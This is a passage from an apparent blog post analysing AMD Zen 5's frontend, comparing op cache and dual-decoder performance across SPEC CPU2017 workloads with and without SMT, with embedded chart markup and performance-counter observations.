https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png" width="1456" height="902" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/b00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:902,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:183843,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Multiplying thread IPC by 2 because I’m running SPEC rate tests with two copies pinned to SMT siblings, and the core should spend negligible time in ST mode</figcaption></figure></div><p>But overall, the dual decode clusters do their job. Even high IPC workloads can be reasonably well fed off the decoders. Performance counters even suggest 525.x264 gains a bit of IPC in decoder-only mode, though that didn’t translate into a score advantage likely due to varying boost clocks.</p><p>In SPEC CPU2017’s floating point tests, the dual decoders pull off a surprising win in 507.cactuBSSN. IPC is higher, and SPEC CPU2017 gives it a score win too.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png" width="1312" height="1031" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1031,&quot;width&quot;:1312,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:274734,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8933fc4f-6bbf-43c6-9ffe-9ba51553daf0_1312x1031.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>507.cactuBSSN is the only workload across SPEC CPU2017 where the op cache hitrate is below 90%. 75.94% isn’t a low op cache hitrate, but it’s still an outlier.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png" width="1456" height="796" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:796,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:200872,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29428380-026b-489d-bdc7-8adfc6dee997_1568x857.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>With both SMT threads active, op cache coverage drops to 61.79%. Two threads will have worse cache locality than a single thread, and thus put more pressure on any cache they have to share. That includes the op cache. Most other tests see minor impact because Zen 5’s op cache is so big that it has little trouble handling even two threads.</p><p>In 507.cactuBSSN, the op cache still delivers the majority of micro-ops. But 61.79% coverage likely means op cache misses aren’t a once-in-a-blue-moon event. Likely, the frontend is transitioning between decoder and op cache mode fairly often.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png" width="1456" height="868" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:868,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:213647,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F14d25cdc-1180-47e2-a5bc-7f6c491581e7_1583x944.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>AMD’s Zen 5 optimization guide suggests such transitions come at a cost.</p><blockquote><p>Excessive transitions between instruction cache and Op Cache mode may impact performance negatively. The size of hot code regions should be limited to the capacity of the Op Cache to minimize these transitions</p><p>Software Optimization Guide for the AMD Zen 5 Microarchitecture</p></blockquote><p>I’m guessing more frequent op cache/decoder transitions, coupled with IPC not being high enough to benefit from the op cache’s higher bandwidth, combine to put pure-decoder mode ahead.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png" width="1456" height="1009" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1009,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:207203,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff11ce30a-203c-4502-ac0d-991094bdefd3_1673x1159.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Besides cactuBSSN’s funny SMT behavior, the rest of SPEC CPU2017’s floating point suite behaves as expected. High IPC workloads like 538.imagick really want the op cache enabled. Lower IPC workloads don’t see a huge difference, though they often still benefit from the op cache. And differences are lower overall with SMT.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png" width="1456" height="1036" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1036,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:205135,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff92debd0-94e2-47ca-b493-7bd8cf75c07d_1559x1109.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>From a performance perspective, using dual 4-wide decoders wouldn’t be great as the primary source of instruction delivery for a modern core. It’s great for multithreaded performance, and can even provide advantages in corner cases with SMT. But overall, the two fetch/decode clusters are far better suited to act as a secondary source of instruction delivery. And that’s the role they play across SPEC CPU2017’s workloads on Zen 5.</p><p>Performance counters can provide additional insight into how hard the frontend is getting pushed. Here, I’m using event 0xAA, which counts micro-ops dispatched from the frontend and provides unit masks to filter by source. I’m also setting the count mask to 1 to count cycles where the frontend is sending ops to the backend from either source (op cache or decoders).</p><p>A single 4-wide decoder isn’t adequate for high IPC workloads, and performance monitoring data backs that up. The frontend has to work overtime in decoder-only mode, and it gets worse as IPC gets higher.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png" width="1456" height="865" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:865,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:234353,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2491956-19a3-4245-b360-f1bf2744564d_1724x1024.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>SPEC CPU2017’s floating point tests make everything more extreme. The floating point suite has a surprising number of moderate IPC workloads that seem to give the decoders a really rough time. For example, 519.lbm averages below 3 IPC and normally doesn’t stress Zen 5’s frontend. But with the op cache off, suddenly the frontend busy for over 90% of core active cycles.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png" width="1456" height="1032" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1032,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:281456,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5143ea51-6165-40d4-96d6-37785607399c_1715x1216.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>SMT increases parallelism and thus potential core throughput, placing higher demand on frontend bandwidth. With the op cache on, frontend load goes up but everything is well within the frontend’s capabilities. With the op cache off, the decoders do an excellent job of picking up the slack. The frontend is a little busier, but the decoders aren’t getting pegged except in very high IPC outliers like 548.exchange2. And exchange2 is a bit of an unfair case because it even pushes the op cache hard.</p><div><figure><a 